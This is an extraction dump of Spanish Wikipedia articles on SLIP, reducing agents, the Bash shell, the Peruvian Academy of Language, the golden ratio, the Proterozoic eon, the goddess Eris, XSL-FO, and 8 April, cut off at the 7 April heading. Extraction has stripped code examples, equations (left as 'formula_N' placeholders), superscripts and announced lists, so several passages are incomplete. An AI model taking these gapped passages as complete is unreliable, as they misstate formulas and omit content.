SLIP dinámico: Cuando se usa SLIP para conectarse a Internet, el servidor del proveedor de acceso a Internet, identifica al ordenador proporcionándole una dirección IP (por ejemplo 150.214.110.8). Mediante SLIP dinámico, esta dirección es asignada dinámicamente por el servidor de entre un conjunto de direcciones. Esta dirección es temporal, y dura lo que dure la conexión.

SLIP estático: Cuando se usa SLIP estático, el servidor del proveedor de acceso a Internet asigna una dirección permanente al ordenador para su uso en todas las sesiones.

SLIP es un protocolo muy simple que fue diseñado y presenta los siguientes inconvenientes:




Se está trabajando en un sucesor de SLIP que supla estas deficiencias. La implementación de SLIP en lenguaje de alto nivel es sencilla. Para más información sobre SLIP consultar en la RFC 1055.

El protocolo SLIP cumple la misma función que PPP, pero se trata de un protocolo mucho más anticuado.




</doc>
<doc id="6262" url="https://es.wikipedia.org/wiki?curid=6262" title="Agente reductor">
Agente reductor

Un agente reductor es aquel que cede electrones a un agente oxidante. Existe una reacción química conocida como reacción de reducción-oxidación, en la que se da una transferencia de electrones. Así mismo, la mayoría de los elementos metálicos y no metálicos se obtienen de sus minerales por procesos de oxidación o de reducción. Una reacción de reducción-oxidación consiste en dos semireacciones: una semireacción implica la pérdida de electrones de un compuesto, en este caso el compuesto se oxida; mientras que en la otra semireacción el compuesto se reduce, es decir gana los electrones. Uno actúa como oxidante y el otro como reductor. Como ejemplos tenemos:


El monóxido de carbono es utilizado en metalurgia como agente reductor, reduciendo los óxidos de los metales. La reducción del mineral se efectúa en el alto horno a unos 900 °C aproximadamente.

Puesto que el aluminio tiene gran afinidad química con el oxígeno se emplea en la metalurgia como reductor, así como para obtener los metales difícilmente reducibles (calcio, litio, y otros) valiéndose del así llamado procedimiento aluminotérmico.




</doc>
<doc id="6263" url="https://es.wikipedia.org/wiki?curid=6263" title="Bash">
Bash

Bash ("") es un programa informático, cuya función consiste en interpretar órdenes, y un lenguaje de consola. Es una shell de Unix compatible con POSIX y el intérprete de comandos por defecto en la mayoría de las distribuciones GNU/Linux, además de macOS. También se ha llevado a otros sistemas como Windows y Android.

Su nombre es un acrónimo de "Bourne-again shell" ("shell Bourne otra vez") –haciendo un juego de palabras ("" significa "nacido de nuevo") sobre la Bourne shell (), que fue uno de los primeros intérpretes importantes de Unix.

Hacia 1978, Bourne era el intérprete distribuido con la versión del sistema operativo Unix Versión 7. Stephen Bourne, por entonces investigador de los Laboratorios Bell, escribió la versión original. Brian Fox escribió Bash para el proyecto GNU en 1987 como sustituto libre de Bourne.
y en 1990, Chet Ramey se convirtió en su principal desarrollador.

La sintaxis de órdenes de Bash es un superconjunto de instrucciones basadas en la sintaxis del intérprete Bourne. La especificación definitiva de la sintaxis de órdenes de Bash, puede encontrarse en el Bash Reference Manual distribuido por el proyecto GNU. Esta sección destaca algunas de sus únicas características.

La mayoría de los "shell scripts" (guiones de intérprete de órdenes) Bourne pueden ejecutarse por Bash sin ningún cambio, con la excepción de aquellos "scripts" del intérprete de órdenes, o consola, Bourne que hacen referencia a variables especiales de Bourne o que utilizan una orden interna de Bourne. La sintaxis de órdenes de Bash incluye ideas tomadas desde los intérpretes Korn shell (ksh) y C shell (csh), como la edición de la línea de órdenes, el historial de órdenes, la pila de directorios, las variables $RANDOM y $PPID, y la sintaxis de substitución de órdenes POSIX: $(...). Cuando se utiliza como un intérprete de órdenes interactivo, Bash proporciona autocompletado de nombres de programas, nombres de archivos, nombres de variables, etc, cuando el usuario pulsa la tecla TAB.

La sintaxis de Bash tiene muchas extensiones que no proporciona el intérprete Bourne. Varias de las mencionadas extensiones se enumeran a continuación.

Los guiones de Bash reciben los argumentos que le pasa la shell como $1, $2, ..., $n. Se puede obtener el número total de argumentos con el símbolo $#.

Usando $# es posible comprobar el número de argumentos entregados al guion antes de realizar alguna acción con ellos:

Otra forma de acceder a los argumentos es a través del "array" $@, por medio del cual se puede iterar sobre todos los argumentos dados:

Una gran limitación del intérprete Bourne es que no puede realizar cálculos con enteros sin lanzar un proceso externo. En cambio, un proceso Bash puede realizar cálculos con enteros utilizando la orden ((...)) y la sintaxis de variables $[...] de la siguiente manera:

La orden ((...)) también se puede utilizar en sentencias condicionales, ya que su código de retorno es 0 o 1 dependiendo de si la condición es cierta o falsa:

La orden ((...)) soporta los siguientes : '==', '!=', '>', '<', '>=', y '<='.

Un proceso Bash no puede realizar cálculos en coma flotante. Las únicas shell Unix capaces de esto son Korn Shell (versión de 1993) y zsh (a partir de la versión 4.0).

La sintaxis de Bash permite diferentes formas de redirección de entrada/salida de las que la shell Bourne tradicional carece. Bash puede redirigir la salida estándar y los flujos de error estándar a la vez utilizando la sintaxis:

que es más simple que teclear la orden Bourne equivalente, "orden > archivo 2>&1". Desde la versión 2.05b, Bash puede redirigir la entrada estándar desde una cadena utilizando la siguiente sintaxis (denominada "here strings"):

Si la cadena contiene espacios en blanco, deben utilizarse comillas.

Ejemplo:
Redirige la salida estándar a un archivo, escribe datos, cierra el archivo y reinicia stdout

Abre y cierra archivos

Captura la salida de órdenes externas

Los procesos Bash 3.0 soportan emparejamiento de expresiones regulares utilizando la siguiente sintaxis, reminiscente de Perl:

La sintaxis de expresiones regulares es la misma que documenta la página de manual regex(3). El estado de salida de la orden anterior es 0 si la cadena concuerda con la expresión regular, y 1 si no coinciden.
En las expresiones regulares puede accederse a las partes delimitadas por paréntesis, utilizando la variable shell BASH_REMATCH, de la siguiente manera:

Esta sintaxis proporciona un rendimiento superior a lanzar un proceso separado para ejecutar una orden grep, porque el emparejamiento de las expresiones regulares tiene lugar en el propio proceso Bash. Si la expresión regular o la cadena contiene un espacio en blanco o un metacarácter del shell (como '*' o '?'), debe ser entrecomillada.

Las palabras con la forma $'string' se tratan de un modo especial. Estas palabras se expanden a string, con los caracteres escapados por la contrabarra reemplazados según especifica el lenguaje de programación C. Las secuencias de escape con contrabarra, se decodifican del siguiente modo:

El resultado expandido se encuentra entrecomillado con comilla simple, como si el signo $ no estuviese presente.

Una cadena entrecomillada con comillas dobles precedida por un signo $ ($"...") será traducida de acuerdo a la localización actual. Si fuese C o POSIX, se ignora el símbolo $. Si la cadena es traducida y reemplazada, el reemplazo estará entrecomillado por comilla doble.

Cuando Bash arranca, ejecuta las órdenes que se encuentran en diferentes guiones.

Cuando se invoca a Bash como un shell interactivo para el inicio de una sesión ("login shell"), o como un shell no interactivo con la opción --login, en primer lugar lee y ejecuta órdenes desde el archivo /etc/profile, si existe. Después, busca ~/.bash_profile, ~/.bash_login, y ~/.profile, en este orden, y lee y ejecuta las órdenes desde el primero que existe y es legible. La opción --noprofile puede utilizarse al comenzar un nuevo shell para inhibir este comportamiento.

Cuando un "login shell" termina, Bash lee y ejecuta las órdenes de ~/.bash_logout, si existe.

Cuando un shell interactivo que no es un "login shell" arranca, Bash lee y ejecuta órdenes desde ~/.bashrc, si existiese. Esto puede evitarse utilizando la opción --norc. La opción --rcfile archivo forzará a Bash a leer y ejecutar órdenes desde archivo en lugar de ~/.bashrc.

Cuando Bash arranca de un modo no interactivo, por ejemplo para ejecutar un guion de consola diferente, busca la variable de entorno BASH_ENV, si existe expande su valor, y lo utiliza como el nombre del archivo para leer y ejecutar. Bash se comporta como si se ejecutase la siguiente orden:

pero el valor de la variable PATH no se utiliza para buscar el archivo.

Si se invoca a Bash con el nombre sh, intenta replicar el comportamiento de las versiones antiguas de sh, a la vez que se mantiene la conformidad con el estándar POSIX. Cuando se invoca como un login shell interactivo, o un shell no interactivo con la opción --login, primero intenta leer y ejecutar órdenes desde /etc/profile y ~/.profile, en este orden. La opción --noprofile puede utilizarse para evitar este comportamiento.

Cuando se invoca como un shell interactivo con el nombre sh, Bash busca la variable ENV, si está definida expande su valor, y utiliza el valor expandido como el nombre de un archivo para leer y ejecutar. Como un shell invocado como sh no intenta leer y ejecutar órdenes desde ningún otro archivo de arranque, y la opción --rcfile no tiene efecto. Un shell no interactivo invocado con el nombre sh no intenta leer ningún otro archivo de arranque. Cuando se invoca como sh, Bash entra en el modo "posix" después de leer los archivos de inicio.

Cuando se inicia Bash en el modo POSIX, por ejemplo con la opción --posix, sigue el estándar POSIX para los archivos de inicio. En este modo, los shells interactivos expanden la variable ENV y se leen, y ejecutan, las órdenes desde el archivo cuyo nombre es el valor de la variable expandida. No se lee ningún otro archivo de arranque.

Bash intenta determinar cuando está siendo ejecutado por un demonio de shell remoto, normalmente rshd. Si Bash determina que está siendo ejecutado por rshd, lee y ejecuta órdenes desde ~/.bashrc, si este archivo existe y es legible. No hará esto si se invoca como sh. La opción --norc puede utilizarse para evitar este comportamiento, y la opción --rcfile puede utilizarse para forzar a leer otro archivo, pero rshd normalmente no invoca al shell con estas opciones o permite que sean especificadas.

Se llama bashismo al uso de características de Bash que no están contempladas en las especificaciones POSIX para los intérpretes de comandos. En general, se recomienda evitarlas, para permitir la portabilidad de guiones a otros sistemas operativos.



Guías Bash de Linux Documentation Project:


Otras guías y tutoriales:



</doc>
<doc id="6265" url="https://es.wikipedia.org/wiki?curid=6265" title="Academia Peruana de la Lengua">
Academia Peruana de la Lengua

La Academia Peruana de la Lengua (APL) es una institución cultural que agrupa a literatos, escritores, poetas, lingüistas y científicos, expertos en el uso del idioma español en el Perú. Es miembro colectivo de la Asociación de Academias de la Lengua Española.

Fue establecida en Lima el 5 de mayo de 1887 por Ricardo Palma, aún el 30 de agosto realizó su primera función pública en el salón de actos de la Universidad Nacional Mayor de San Marcos, cuando se eligió como primer presidente a Francisco García Calderón, expresidente del Perú. Si bien es cierto que se inauguró en 1887, su inicio fue pospuesto a causa de la Guerra del Pacífico, ya que durante la ocupación chilena de Lima gran parte de los libros de la Biblioteca Nacional fueron sustraídos y llevados a Chile como botín de guerra; este suceso forzó que Ricardo Palma priorice la reconstrucción de la Biblioteca dejando de lado la idea de inaugurar años antes la APL.

A García Calderón le sucede Ricardo Palma, primero como presidente y luego como director. Palma fue un valiente defensor de los "peruanismos", que expuso en sus libros "Papeletas lexicográficas" y "Neologismos y americanismos", además de luchar contra la Real Academia Española para que los acepte. 

Entre sus miembros se encuentra Mario Vargas Llosa, galardonado con el Premio Cervantes (1994) y con el Premio Nobel de Literatura (2010), quien además tiene un sillón en la Real Academia Española. Pero junto a este insigne nombre de la literatura hispnoamericana, también fueron miembros de renombre: Víctor Andrés Belaúnde, Guillermo Hoyos Osores, Augusto Tamayo Vargas, Luis Jaime Cisneros, además Aurelio y Francisco Miró Quesada. En el terreno de la lingüística quechua relacionada al castellano del Perú, participa Rodolfo Cerrón Palomino, y en peruanismos- sobre todo limeñismos y arcaismos- , Martha Hildebrandt. 

El poeta y traductor Ricardo Silva-Santisteban (Lima, 1941) fue el presidente de la institución desde el 2014 hasta el 2017.

La Academia- con sede en Lima- organizó el VIII Congreso Internacional de la Asociación de Academias (1980).







</doc>
<doc id="6266" url="https://es.wikipedia.org/wiki?curid=6266" title="Número áureo">
Número áureo

El número áureo (también llamado número de oro, razón extrema y media, razón áurea, razón dorada, media áurea, proporción áurea y divina proporción) es un número irracional, representado por la letra griega φ (phi) (en minúscula) o Φ (Phi) (en mayúscula) en honor al escultor griego Fidias.

La ecuación se expresa de la siguiente manera:

También se representa con la letra griega Tau (Τ τ), por ser la primera letra de la raíz griega "τομή", que significa "acortar", aunque es más común encontrarlo representado con la letra fi ("phi") (Φ,φ). También se representa con la letra griega alpha minúscula.

Se trata de un número algebraico irracional (su representación decimal no tiene período) que posee muchas propiedades interesantes y que fue descubierto en la antigüedad, no como una expresión aritmética, sino como relación o proporción entre dos segmentos de una recta, es decir, una construcción geométrica. Esta proporción se encuentra tanto en algunas figuras geométricas como en la naturaleza: en las nervaduras de las hojas de algunos árboles, en el grosor de las ramas, en el caparazón de un caracol, en los flósculos de los girasoles, etc. Una de sus propiedades aritméticas más curiosas es que su cuadrado (Φ = 2,61803398874988...) y su inverso (1/Φ = 0,61803398874988...) tienen las mismas infinitas cifras decimales.

Asimismo, se atribuye un carácter estético a los objetos cuyas medidas guardan la proporción áurea. Algunos incluso creen que posee una importancia mística. A lo largo de la historia, se ha atribuido su inclusión en el diseño de diversas obras de arquitectura y otras artes, aunque algunos de estos casos han sido cuestionados por los estudiosos de las matemáticas y el arte.

El número áureo es el valor numérico de la proporción que guardan entre sí dos segmentos de recta "a" y "b" ("a" más largo que "b"), que cumplen la siguiente relación:


Siendo el valor del número áureo φ el cociente: formula_1
Surge al plantear el problema geométrico siguiente: partir un segmento en otros dos, de forma que, al dividir la longitud total entre la del segmento mayor, obtengamos el mismo resultado que al dividir la longitud del segmento mayor entre la del menor.

Dos números "a" y "b" están en proporción áurea si se cumple: 

Si formula_2 entonces la ecuación queda:

La solución positiva de la ecuación de segundo grado es:
que es el valor del número áureo, equivalente a la relación formula_3.

Algunos autores sugieren que el número áureo se encuentra como proporción en varias estelas de Babilonia y Asiria de alrededor de Sin embargo, no existe documentación histórica que indique que el número áureo fuera utilizado conscientemente por dichos artistas en la elaboración de las estelas. Cuando se mide una estructura compleja, es fácil obtener resultados curiosos si se tienen muchas medidas disponibles. Además, para que se pueda afirmar que el número áureo está presente, las medidas deben tomarse desde puntos significativos del objeto, pero este no es el caso de muchas hipótesis que defienden la presencia del número áureo. Por todas estas razones Mario Livio concluye que es muy improbable que los babilonios hayan descubierto el número áureo.

El primero en hacer un estudio formal del número áureo fue Euclides (c. 300-), quien lo definió de la siguiente manera:
Euclides demostró también que este número no puede ser descrito como la razón de dos números enteros; es decir, es un número irracional.

Platón (c. 428-) vivió antes de que Euclides estudiara el número áureo. Sin embargo, a veces se le atribuye el desarrollo de teoremas relacionados con el número áureo debido a que el historiador griego Proclo escribió:

Aquí a menudo se interpretó la palabra sección (τομή) como la sección áurea. Sin embargo a partir del siglo XIX esta interpretación ha sido motivo de gran controversia y muchos investigadores han llegado a la conclusión de que la palabra "sección" no tuvo nada que ver con el número áureo. No obstante, Platón consideró que los números irracionales, descubiertos por los pitagóricos, eran de particular importancia y la llave de la física del cosmos. Esta opinión tuvo una gran influencia en muchos filósofos y matemáticos posteriores, en particular los neoplatónicos.

A pesar de lo discutible de su conocimiento sobre el número áureo, Platón se ocupó de estudiar el origen y la estructura del cosmos, cosa que intentó usando los cinco sólidos platónicos, construidos y estudiados por Teeteto. En particular, combinó la idea de Empédocles sobre la existencia de cuatro elementos básicos de la materia, con la teoría atómica de Demócrito. Para Platón, cada uno de los sólidos correspondía a una de las partículas que conformaban cada uno de los elementos: la tierra estaba asociada al cubo, el fuego al tetraedro, el aire al octaedro, el agua al icosaedro, y finalmente el Universo como un todo, estaba asociado con el dodecaedro.

En 1509 el matemático y teólogo italiano Luca Pacioli publicó "De Divina Proportione" (La Divina Proporción), donde plantea cinco razones por las que estima apropiado considerar divino al número áureo:

En 1525, Alberto Durero publicó "Instrucción sobre la medida con regla y compás de figuras planas y sólidas", donde describe cómo trazar con regla y compás la espiral áurea basada en la sección áurea, que se conoce como “espiral de Durero”.

El astrónomo Johannes Kepler (1571-1630) desarrolló un modelo platónico del sistema solar utilizando los sólidos platónicos, y se refirió al número áureo en términos grandiosos:

El primer uso conocido del adjetivo áureo, dorado, o de plata, para referirse a este número lo hace el matemático alemán Martin Ohm, hermano del célebre físico Georg Simon Ohm, en la segunda edición de 1835 de su libro "Die Reine Elementar Matematik" ("Las matemáticas puras elementales"). Ohm escribe en una nota al pie:

A pesar de que la forma de escribir sugiere que el término ya era de uso común para la fecha, el hecho de que no lo incluyera en su primera edición sugiere que el término pudo ganar popularidad alrededor de 1830.

En los textos de matemáticas que trataban el tema, el símbolo habitual para representar el número áureo fue τ, del griego "τομή", que significa ‘corte o sección’. Sin embargo, la moderna denominación Φ o φ la efectuó en 1900 el matemático Mark Barr en honor a Fidias, ya que ésta era la primera letra de su nombre escrito en griego ("Φειδίας"). Este honor se le concedió a Fidias por el máximo valor estético atribuido a sus esculturas, propiedad que ya por entonces se le atribuía también al número áureo. Mark Barr y Schooling fueron responsables de los apéndices matemáticos del libro "The Curves of Life", de sir Theodore Cook.





La expresión mediante fracciones continuas es:

}}</math>

Esta iteración es la única donde sumar es multiplicar y restar es dividir. Es también la más simple de todas las fracciones continuas y la que tiene la convergencia más lenta. Esa propiedad hace que además el número áureo sea un número mal aproximable mediante racionales que de hecho alcanza el peor grado posible de aproximabilidad mediante racionales.

Por ello se dice que formula_24 es el número más alejado de lo racional o el número más irracional. Este es el motivo por el cual aparece en el teorema de Kolmogórov-Arnold-Moser.

Éstas corresponden al hecho de que el diámetro de un pentágono regular (distancia entre dos vértices no consecutivos) es φ veces la longitud de su lado, y de otras relaciones similares en el pentagrama.

Esta fórmula como caso particular de una identidad general publicada por Nathan Altshiller-Court, de la Universidad de Oklahoma, en la revista "American Mathematical Monthly", 1917. El teorema general dice que la expresión 

donde formula_40, es igual a la mayor de las raíces de la ecuación formula_41 o sea, formula_42.

Si se denota el enésimo número de Fibonacci como "F", y al siguiente número de Fibonacci como "F", descubrimos que, a medida que "n" aumenta, esta razón oscila y es alternativamente menor y mayor que la razón áurea. Podemos también notar que la fracción continua que describe al número áureo produce siempre números de Fibonacci a medida que aumenta el número de unos en la fracción. Por ejemplo: formula_43; formula_44; y formula_45, lo que se acerca considerablemente al número áureo. Entonces se tiene que:

Esta propiedad fue descubierta por el astrónomo alemán Johannes Kepler, pero pasaron más de cien años antes de que fuera demostrada por el matemático inglés Robert Simson.

Con posterioridad se encontró que cualquier sucesión aditiva recurrente de orden 2 tiende al mismo límite. Por ejemplo, si tomamos dos números naturales arbitrarios, por ejemplo 3 y 7, la sucesión recurrente resulta: 3 - 7 - 10 - 17 - 27 - 44 - 71 - 115 - 186 - 301... Los cocientes de términos sucesivos producen aproximaciones racionales que se acercan asintóticamente por exceso y por defecto al mismo límite: 44/27 = 1,6296296...; 71/44 = 1,613636...; 301/186 = 1,6182795.

A mediados del siglo XIX, el matemático francés Jacques Philippe Marie Binet redescubrió una fórmula que aparentemente ya era conocida por Leonhard Euler, y por otro matemático francés, Abraham de Moivre. La fórmula permite encontrar el enésimo número de Fibonacci sin la necesidad de producir todos los números anteriores. La fórmula de Binet depende exclusivamente del número áureo:

El número áureo y la sección áurea están presentes en todos los objetos geométricos regulares o semiregulares en los que haya simetría pentagonal, que sean pentágonos o que aparezca de alguna manera la raíz cuadrada de cinco.


El rectángulo "AEFD" es áureo porque sus lados AE y AD están en la proporción del número áureo. Euclides, en su proposición 2.11 de "Los elementos", obtiene su construcción:

Con centro en G se obtiene el punto E, y por lo tanto:

con lo que resulta evidente que

de donde, finalmente,

Por otra parte, los rectángulos AEFD y BEFC son semejantes, de modo que este último es asimismo un rectángulo áureo.

El número áureo tiene un papel muy importante en los pentágonos regulares y en los pentagramas. Cada intersección de partes de un segmento se interseca con otro segmento en una razón áurea.

El pentagrama incluye diez triángulos isóceles: cinco acutángulos y cinco obtusángulos. En ambos, la razón de lado mayor y el menor es φ. Estos triángulos se conocen como los triángulos áureos.

Teniendo en cuenta la gran simetría de este símbolo, se observa que dentro del pentágono interior es posible dibujar una nueva estrella, con una recursividad hasta el infinito. Del mismo modo, es posible dibujar un pentágono por el exterior, que sería a su vez el pentágono interior de una estrella más grande. Al medir la longitud total de una de las cinco líneas del pentáculo interior, resulta igual a la longitud de cualquiera de los brazos de la estrella mayor, o sea Φ. Por lo tanto, el número de veces en que aparece el número áureo en el pentagrama es infinito al añadir infinitos pentagramas.

Claudio Ptolomeo desarrolló un teorema conocido como el teorema de Ptolomeo, el cual permite trazar un pentágono regular mediante regla y compás. Aplicando este teorema, se forma un cuadrilátero al quitar uno de los vértices del pentágono, Si las diagonales y la base mayor miden b, y los lados y la base menor miden a, resulta que "b" = "a" + "ab" lo que implica:

Otros investigadores famosos se inclinan por la hipótesis de que los constructores intentaron una cuadratura del círculo, pues la raíz cuadrada del número áureo se aproxima mucho al cociente de 4 sobre π. Pero una construcción tal, aunque se conociera π con una aproximación grande, carecería completamente de interés geométrico.

No obstante, con base en mediciones no es posible elegir entre una u otra pues la diferencia sobre el monumento real no es mayor a 14,2 cm y esta pequeña variación queda enmascarada por las incertidumbres de las medidas, los errores constructivos y, principalmente, porque la pirámide perdió el revestimiento en manos de los primeros constructores de El Cairo. Para que esto quede más claro, una precisión del 1 por mil en una base de 230 metros equivale a 23 centímetros y en la altura está en el orden de la diferencia real que debería existir entre ambas posibilidades.


Como dato adicional para indicar la complejidad del tratamiento del edificio se tiene que en 1837 fueron descubiertas correcciones ópticas en el Partenón. El templo tiene tres vistas principales y si sus columnas estuvieran efectivamente a plomo, todas sus líneas fuesen paralelas y perfectamente rectas y los ángulos rectos fueran exactos, por las propiedades de la visión humana el conjunto se vería más ancho arriba que en la base, sus columnas se percibirían inclinadas hacia afuera y la línea que fundamenta el techo sobre las columnas se vería como una especie de catenaria, con los extremos del edificio aparentemente más altos que el centro. Los constructores hicieron la construcción compensando estos efectos de ilusión óptica inclinando o curvando en sentido inverso a los elementos involucrados. Así las columnas exteriores, en ambos lados del frente, están inclinadas hacia adentro en un ángulo de 2,65 segundos de arco, mientras que las que están en el medio tienen una inclinación de 2,61 segundos de arco. La línea que formarían los dinteles entre columnas y que constituye la base del triángulo que corona el edificio, en realidad es un ángulo de 2,64 segundos de arco con el vértice más elevado que los extremos. De esta forma, y con otras correcciones que no se mencionan aquí, se logra que cualquier observador que se sitúe en los tres puntos principales de vista vea todo el conjunto paralelo, uniforme y recto.

En orden cronológico:



</doc>
<doc id="6270" url="https://es.wikipedia.org/wiki?curid=6270" title="Eón Proterozoico">
Eón Proterozoico

El Proterozoico (de πρότερος, próteros = anterior, temprano y ζῶον, zôon = ser vivo), una división de la escala temporal geológica antes también conocida como Algónquico o Eozoico, es un eón geológico perteneciente al Precámbrico que abarca desde hace 2500 millones de años hasta hace 542 millones de años, durando 1958 ± 1,0 millones de años. Se caracteriza por la presencia de grandes cratones que darán lugar a las plataformas continentales. Las cordilleras generadas en este eón sufrieron los mismos procesos que los fanerozoicos. La intensidad del metamorfismo disminuyó en este momento geológico. La Tierra sufre sus primeras glaciaciones y se registra una gran cantidad de estromatolitos. Sin duda, supusieron un importante cambio en la biota terrestre. El período Ediacárico de finales del Proterozoico se caracteriza por la evolución de abundantes organismos pluricelulares de cuerpo blando. 

El registro geológico del Proterozoico es mucho mejor que el de la época anterior, el Eón Arcaico. Al contrario que los depósitos de agua profunda del Eón Arcaico, el Proterozoico posee muchos estratos que fueron depositados en extensos mares epicontinentales superficiales. Además, muchas de estas rocas están menos metamorfizadas que las del Arcaico, y un alto número permanecen inalteradas. Los estudios de estas rocas muestran que durante este eón se produjo acreción continental rápida y masiva (única del Proterozoico), ciclos de supercontinentes y la moderna actividad orogénica.

Las primeras glaciaciones conocidas se produjeron durante el Proterozoico. La primera, la Glaciación Huroniana, se produjo poco después del comienzo del eón en el Período Riásico y culminaron en el Período Criogénico con la hipótesis de la Tierra bola de nieve.

Uno de los eventos más importantes del Proterozoico fue el aumento de la concentración de oxígeno en la atmósfera de la Tierra. Aunque el oxígeno producido como sustancia de desecho por la fotosíntesis comenzó a producirse ya hace 2800 millones de años, en el Eón Arcaico, el porcentaje de oxígeno en la atmósfera se mantuvo probablemente a sólo un 1% al 2% de su nivel actual hasta que los sumideros químicos (oxidación de azufre y hierro) se saturaron hace aproximadamente 2450 millones de años, cuando comienza la Gran Oxidación. Las formaciones de hierro bandeado, que proporcionan la mayor parte de mineral de hierro del mundo son el resultado de estos sumideros químicos de oxígeno. La formación de estas estructuras cesó hace 1.900 millones de años.

La capas rojas, coloreadas por hematitas, indican un incremento del oxígeno en la atmósfera a partir de 2000 millones de años atrás, ya que estas no se encuentran en las rocas más antiguas. La acumulación de oxígeno fue debida probablemente a dos factores: la saturación de los sumideros y el aumento en el enterramiento de carbono, secuestrado por los compuestos orgánicos que de otra forma habría sido oxidado por la atmósfera.

Durante el Proterozoico se produjo la expansión de cianobacterias, de hecho, los estromatolitos alcanzaron su mayor abundancia y diversidad durante este período, con un pico hace aproximadamente 1200 millones de años.

Las primeras células eucariotas y los primeros pluricelulares (mediante el análisis químico de rocas que datan de hace 635 millones de años, se ha descubierto una forma modificada de colesterol, que es producida sólo por las esponjas), se originaron una vez que se produjo la acumulación de oxígeno libre. Esto puede haberse debido a un aumento de los nitratos oxidados que los eucariotas necesitan, en contraste con las cianobacterias. Durante el Proterozoico también se produjo la simbiosis entre los proto-eucariotas y los antecesores de mitocondrias (para casi todos los eucariotas) y de cloroplastos (para las plantas y algunos protistas).

Los eucariontes podrían haber surgido hace unos 2000 millones de años, pero los fósiles más tempranos como los acritarcos, al no conservar una morfología distintiva, son difíciles de interpretar. Los primeros fósiles que pueden identificarse claramente como eucariotas son de "Melanocyrillium", probablemente amebas con caparazón, de hace 760 millones de años.

Clásicamente, el límite entre los eones Proterozoico y Fanerozoico se fijó al inicio del Cámbrico, período en el que aparecieron los primeros fósiles de animales como trilobites y arqueociatos. En la segunda mitad del siglo XX, se encontró una serie de formas fósiles en rocas del Proterozoico, la denomina fauna de Ediacara, pero el inicio del Cámbrico, se ha mantenido fijo a 542 millones de años.

El Proterozoico está dividido en tres eras: Paleoproterozoico (2500 - 1600 millones de años), Mesoproterozoico (1600 - 1000 millones de años) y Neoproterozoico (1.000 - 542,0 ±1,0 millones de años).




</doc>
<doc id="6271" url="https://es.wikipedia.org/wiki?curid=6271" title="Eris (mitología)">
Eris (mitología)

En la mitología griega Eris o Éride (en griego antiguo Ἒρις) es la diosa de la discordia. En la mitología romana, su equivalente es Éride.

En los "Trabajos y días", Hesíodo distingue dos diosas diferentes llamadas Eris:

En la "Teogonía", Hesíodo habla menos amablemente de Discordia, hija de la Noche, al engendrar otras personificaciones:

La otra Discordia es presumiblemente la que aparece en la "Ilíada" de Homero como hermana de Ares y por tanto hija de Zeus y/o Hera (no se especifica el nombre de los padres). Esta diosa es referida por otros autores con el nombre de Enio para diferenciarla de Eris:

Al principio del Libro XI de la "Ilíada", Zeus envía a Eris para provocar a los aqueos.

La leyenda más famosa protagonizada por Eris cuenta cómo inició la Guerra de Troya. Tanto los dioses y diosas como diversos mortales fueron invitados a la boda de Peleo y Tetis (que luego serían padres de Aquiles). Sólo la diosa Eris no fue invitada debido a su naturaleza problemática. 

Así que Eris (en un fragmento de la "Cipria", como parte de un plan urdido por Zeus y Temis) apareció en la fiesta con la Manzana de la Discordia, una manzana dorada con la palabra "kallisti" (‘para la más hermosa’ o ‘para la más bella’) inscrita, que arrojó entre las diosas provocando que Afrodita, Hera y Atenea la reclamasen para sí, iniciándose una riña. Zeus, para no tener que elegir entre las diosas, puesto que una es su esposa y las otras dos son sus hijas, encargó ser juez a Paris. Entonces Hermes le transmitió al desventurado Paris, príncipe de Troya, que tendría que elegir a la más hermosa (ver Juicio de Paris). Siendo como era la moralidad mitológica griega, cada una de las tres diosas intentó sobornarle para que la eligiera: Hera le ofreció poder político y tierras, Atenea le prometió sabiduría y destreza militar, y Afrodita le tentó con la mujer más hermosa de la tierra, Helena, esposa de Menelao de Esparta. Siendo Paris un joven apasionado, y aunque no se sabe cuánto tiempo meditó sobre la cuestión, terminó por conceder la manzana a Afrodita, raptando luego a Helena y provocando así la Guerra de Troya.

En las "Dionisíacas", Nono de Panópolis cuenta que cuando Tifón se prepara para luchar con Zeus:

Eris es la principal antagonista de la película animada de 2003" "; su voz es interpretada por Michelle Pfeiffer.

Eris es el antagonista principal de Eris, Diosa Maligna, la primera película de la serie de anime "Saint Seiya".
En el programa televisivo "", el personaje recurrente "Strife" (Discordia) es sobrino de Ares 
y siembra discordia para ayudar a los planes adicionales de este. 

En la serie de Cartoon Network " Las Sombrías Aventuras de Billy y Mandy", Eris se muestra con su manzana dorada de la discordia y es representada de manera cómica.

Eris aparece en un cameo en la novela de fantasía" La casa de Hades" como uno de los varios hijos de Nyx vistos en el libro.

Discordia aparece como personaje en "" como secuaz de Ares, dios de la guerra. En ella se le representa como una adolescente altanera y de malos modales, la típica chica mala. En un episodio intenta cobrar retribución (siendo nombrada por Ares como diosa de la retribución) por el asesinato de una caza-recompensas que iba tras la princesa guerrera. En otro episodio se muestra como contraparte de Afrodita. Al final de la quinta temporada es asesinada por Xena cuando se le brinda el poder de matar dioses.

En los Nuevos 52 Eris pasó a llamarse "Strife", una alcohólica con carácter sarcástico y venenoso.

En Eris paso a ser un draconequus antagonista llamado Discord espíritu o amo del caos teniendo cierta actitud problemática y caótica de Eris.

Discordia aparece como personaje jugable en el videojuego SMITE

Eris es la diosa que sustituye a Aqua al comienzo de Konosuba.



</doc>
<doc id="6274" url="https://es.wikipedia.org/wiki?curid=6274" title="XSL Formatting Objects">
XSL Formatting Objects

Un documento XSL-FO es un documento XML en el que se especifica cómo se van a formatear unos datos para presentarlos en pantalla, papel u otros medios. El significado de las siglas XSL-FO es eXtensible Stylesheet Language Formatting Objects.
Hay que destacar que en el documento XSL-FO figuran tanto los datos como el formato que se les va a aplicar.

La unidad básica de trabajo en un documento XSL-FO es el "Formating Object", unidad básica para presentar (formatear) la información. Estos objetos de formato se refieren a páginas, párrafos, tablas, etc.

Éste es un breve ejemplo de documento XSL-FO:
Para obtener el documento XSL-FO pueden seguirse dos vías: 

Cuando se tiene el documento XSL-FO, puede ser procesado por un programa llamado "procesador de XSL-FO" para obtener el documento final en distintos formatos. El formato final más utilizado es el PDF.

Los procesadores XSL-FO libres más conocidos son FOP y PassiveTeX.

XSL-FO es una recomendación del World Wide Web Consortium. El nombre oficial de la recomendación es Extensible Stylesheet Language (XSL) y no XSL-FO.




</doc>
<doc id="6275" url="https://es.wikipedia.org/wiki?curid=6275" title="8 de abril">
8 de abril

El 8 de abril es el 98.º (nonagésimo octavo) día del año en el calendario gregoriano y el 99.º en los años bisiestos. Quedan 267 días para finalizar el año.








</doc>
<doc id="6276" url="https://es.wikipedia.org/wiki?curid=6276" title="7 de abril">
7 de abril

